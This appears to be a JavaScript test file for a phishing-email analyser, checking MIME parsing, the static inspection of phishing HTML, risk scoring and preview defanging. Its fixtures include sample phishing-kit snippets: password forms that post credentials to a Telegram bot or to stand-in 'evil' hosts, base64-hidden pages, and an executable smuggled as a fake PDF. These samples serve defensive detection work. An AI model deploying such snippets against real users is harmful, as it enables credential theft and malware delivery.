// HTML bodies, HTML attachments and the preview.
//
// Covers the white-page preview causes (a body part mistaken for an
// attachment), the static reading of phishing HTML (where it sends data, what
// it hides), and the verdict floors those findings set.
// Run: node tests/html.test.mjs

import assert from "node:assert/strict";
import { parseBody } from "../scripts/parse-body.js";
import { parseHeaders } from "../scripts/parse-headers.js";
import { parseAuth } from "../scripts/parse-auth.js";
import { extractIOCs } from "../scripts/extract-iocs.js";
import { calculateScore } from "../scripts/score.js";
import { inspectHtml, looksLikeHtml } from "../scripts/html-inspect.js";
import { cidMap, describePreview, defangForTooltip } from "../scripts/preview.js";

let passed = 0;
const failures = [];
function test(name, fn) {
  try {
    fn();
    passed++;
  } catch (e) {
    failures.push({ name, message: e.message });
  }
}

const H = "From: a@b.test\r\nTo: c@d.test\r\nSubject: s\r\nMIME-Version: 1.0\r\n";
const b64 = (s) => Buffer.from(s).toString("base64");

// ===== body versus attachment =====

test("an HTML body carrying a Content-ID is the body, not an attachment", () => {
  const b = parseBody(
    H + 'Content-Type: multipart/alternative; boundary="a"\r\n\r\n--a\r\nContent-Type: text/plain\r\n\r\nplain\r\n--a\r\nContent-Type: text/html\r\nContent-ID: <part1@x>\r\n\r\n<html><body><p>Real</p></body></html>\r\n--a--',
  );
  assert.match(b.html || "", /Real/);
  assert.deepEqual(b.attachments, []);
});

test("an inline HTML part with a filename is the body", () => {
  const b = parseBody(
    H + 'Content-Type: multipart/mixed; boundary="m"\r\n\r\n--m\r\nContent-Type: text/html; name="body.html"\r\nContent-Disposition: inline; filename="body.html"\r\n\r\n<html><body><p>Inline</p></body></html>\r\n--m--',
  );
  assert.match(b.html || "", /Inline/);
});

test("an HTML attachment stays an attachment, with or without a disposition", () => {
  for (const disposition of ['Content-Disposition: attachment; filename="invoice.html"\r\n', ""]) {
    const b = parseBody(
      H + `Content-Type: multipart/mixed; boundary="m"\r\n\r\n--m\r\nContent-Type: text/plain\r\n\r\nsee file\r\n--m\r\nContent-Type: text/html; name="invoice.html"\r\n${disposition}\r\n<html><body>phish</body></html>\r\n--m--`,
    );
    assert.equal(b.html, null, `disposition: ${disposition || "none"}`);
    assert.deepEqual(b.attachments.map((a) => a.filename), ["invoice.html"]);
  }
});

test("HTML sent as plain text is recognised as HTML", () => {
  assert.equal(looksLikeHtml("<html><body><h1>Hi</h1></body></html>"), true);
  assert.equal(looksLikeHtml("<div><p>a</p><a href=x>b</a><br></div>"), true);
  assert.equal(looksLikeHtml("Plain words, maybe a <b>tag</b>."), false);
});

// ===== static reading of phishing HTML =====

const telegramKit = `<html><body><form><input type="password" name=p></form><script>
fetch("https://api.telegram.org/bot123:ABC/sendMessage?text="+p.value);
location.href="https://login.microsoftonline.com/";</script></body></html>`;

test("a login page posting to a Telegram bot is read correctly", () => {
  const r = inspectHtml(telegramKit);
  assert.equal(r.passwordForm, true);
  assert.deepEqual(r.exfil, ["Telegram bot"]);
  const tg = r.destinations.find((d) => d.url.includes("telegram"));
  assert.equal(tg.kind, "fetch");
  assert.ok(r.destinations.some((d) => d.kind === "redirect"), "the redirect afterwards is found too");
});

test("a hidden file and the name it is saved under are recovered", () => {
  const zip = Buffer.concat([Buffer.from([0x50, 0x4b, 3, 4]), Buffer.alloc(900, 7)]).toString("base64");
  const r = inspectHtml(`<script>var d="${zip}";a.download="Invoice_2291.zip";</script>`);
  assert.equal(r.payloads.length, 1);
  assert.equal(r.payloads[0].name, "Invoice_2291.zip");
  assert.match(r.payloads[0].type, /ZIP/);
});

test("a page hidden in a base64 layer is decoded and read", () => {
  const inner = `<form action="https://collect.evil-kit.test/p.php"><input type=password></form>`;
  const r = inspectHtml(`<script>document.write(atob("${b64(inner)}"))</script>`);
  assert.equal(r.passwordForm, true);
  assert.equal(r.hiddenLayers, 1);
  assert.ok(r.destinations.some((d) => d.url === "https://collect.evil-kit.test/p.php" && /hidden/.test(d.via)));
});

test("a page hidden in a percent-encoded layer is decoded and read", () => {
  const inner = `<html><body><form action="https://collect.evil-kit.test/p.php"><input type=password></form></body></html>`;
  const r = inspectHtml(`<script>document.write(unescape("${encodeURIComponent(inner)}"))</script>`);
  assert.equal(r.passwordForm, true);
  assert.equal(r.hiddenLayers, 1);
});

test("ordinary pages raise nothing", () => {
  const r = inspectHtml(
    `<html><body><img src="data:image/png;base64,${"A".repeat(400)}"><p>Hello</p><a href="https://example.com">site</a>
     <script>var q = decodeURIComponent("hello%20world and a long ordinary sentence for an analytics snippet, nothing else");</script></body></html>`,
  );
  assert.equal(r.passwordForm, false);
  assert.deepEqual(r.exfil, []);
  assert.deepEqual(r.payloads, [], "an inline logo is not a payload");
  assert.equal(r.hiddenLayers, 0);
});

test("an ambiguous host only counts as exfiltration when data is sent to it", () => {
  const link = inspectHtml(`<a href="https://docs.example.workers.dev/">docs</a>`);
  assert.deepEqual(link.exfil, [], "a link to a Worker site is ordinary");
  const sent = inspectHtml(`<script>fetch("https://grab.evil.workers.dev/c", {method:"POST"})</script>`);
  assert.deepEqual(sent.exfil, ["Cloudflare Worker"]);
});

// ===== the whole pipeline =====

function analyseMessage(raw) {
  const headers = parseHeaders(raw);
  const auth = parseAuth(headers);
  const body = parseBody(raw);
  const iocs = extractIOCs(headers, body);
  return { iocs, score: calculateScore(auth, iocs, null, headers) };
}

const withAttachment = (name, html) =>
  H +
  `Content-Type: multipart/mixed; boundary="m"\r\n\r\n--m\r\nContent-Type: text/plain\r\n\r\nPlease see attached.\r\n--m\r\nContent-Type: text/html; name="${name}"\r\nContent-Disposition: attachment; filename="${name}"\r\nContent-Transfer-Encoding: base64\r\n\r\n${b64(html)}\r\n--m--`;

test("an HTML attachment's findings become flags, URLs and files", () => {
  const mz = Buffer.concat([Buffer.from([0x4d, 0x5a, 0x90, 0]), Buffer.alloc(900, 1)]).toString("base64");
  const kit = telegramKit.replace("</body>", `<script>var d="${mz}";a.download="Scan.pdf";</script></body>`);
  const { iocs } = analyseMessage(withAttachment("Scan_0931.html", kit));

  const page = iocs.attachments.find((a) => a.value === "Scan_0931.html");
  const labels = page.riskFlags.map((f) => f.label);
  for (const expected of ["Login page", "Sends to Telegram bot", "Carries 1 hidden file"]) {
    assert.ok(labels.includes(expected), `missing flag ${expected}: ${labels}`);
  }

  const tg = iocs.urls.find((u) => u.value.includes("api.telegram.org"));
  assert.ok(tg, "the Telegram endpoint is an indicator");
  assert.ok(tg.risks.some((r) => r.type === "exfil-endpoint"));
  assert.match(tg.source, /Inside Scan_0931\.html/);

  const hidden = iocs.attachments.find((a) => a.value === "Scan.pdf");
  assert.ok(hidden, "the hidden file is listed as an attachment");
  assert.equal(hidden.embeddedIn, "Scan_0931.html");
  assert.ok(hidden.riskFlags.some((f) => f.label === "Executable content"), "a program named .pdf is caught");
});

test("a Telegram-posting login page is High Risk however it authenticates", () => {
  const { score } = analyseMessage(withAttachment("Scan.html", telegramKit));
  assert.equal(score.tier, "High Risk");
  assert.match(score.reasons[0], /^Decisive: stolen data would be sent to a Telegram bot/);
  // The page is HTML, not a program: it must not be described as one.
  assert.ok(!score.reasons.some((r) => /Scan\.html is a program/.test(r)), score.reasons.join(" | "));
});

test("a program hidden inside a page is named as the program it is", () => {
  const mz = Buffer.concat([Buffer.from([0x4d, 0x5a, 0x90, 0]), Buffer.alloc(900, 1)]).toString("base64");
  const { score } = analyseMessage(withAttachment("View.html", `<script>var d="${mz}";a.download="Invoice.pdf";</script>`));
  assert.equal(score.tier, "High Risk");
  assert.ok(score.reasons.some((r) => /^Decisive: Invoice\.pdf is a program/.test(r)), score.reasons.join(" | "));
});

test("a login page alone is at least Suspicious", () => {
  const { score } = analyseMessage(withAttachment("Login.html", `<form><input type="password"></form>`));
  assert.ok(["Suspicious", "High Risk"].includes(score.tier), score.tier);
  assert.ok(score.reasons.some((r) => /login page arrives as an attachment/i.test(r)));
});

test("an ordinary HTML attachment sets no floor", () => {
  const { score, iocs } = analyseMessage(withAttachment("newsletter.html", `<html><body><h1>News</h1><a href="https://example.com">read</a></body></html>`));
  assert.equal(iocs.attachments[0].risky, false);
  assert.ok(!score.reasons.some((r) => /^Decisive/.test(r)));
});

test("a password form in the message body is flagged", () => {
  const { iocs, score } = analyseMessage(
    H + `Content-Type: text/html\r\n\r\n<html><body><form action="https://x.evil.test/l"><input type=password></form></body></html>`,
  );
  assert.equal(iocs.bodyFindings.passwordForm, true);
  assert.ok(score.reasons.some((r) => /message itself/.test(r)));
});

// ===== preview helpers (the DOM part runs in the browser) =====

test("embedded images are mapped by Content-ID, other types are not", () => {
  const map = cidMap([
    { contentId: "<Logo@X>", contentType: "image/png", bytes: new Uint8Array([137, 80, 78, 71]) },
    { contentId: "<doc@x>", contentType: "application/pdf", bytes: new Uint8Array([37, 80]) },
    { contentId: "<empty@x>", contentType: "image/png", bytes: new Uint8Array() },
  ]);
  assert.deepEqual([...map.keys()], ["logo@x"]);
  assert.match(map.get("logo@x"), /^data:image\/png;base64,/);
});

test("tooltips never carry a live link", () => {
  assert.equal(defangForTooltip("https://evil.test/a.b"), "hxxps[://]evil[.]test/a[.]b");
});

test("the note says what was left out", () => {
  assert.equal(
    describePreview({ remoteImages: 2, embeddedImages: 1, missingEmbedded: 0, links: 1, removed: 0, stylesheets: 0 }),
    "2 remote images blocked · 1 embedded image shown · 1 link disabled — hover to see the destination",
  );
});

console.log(`\n${passed} passed, ${failures.length} failed`);
for (const f of failures) console.error(`  FAIL  ${f.name}\n        ${f.message}`);
process.exit(failures.length ? 1 : 0);
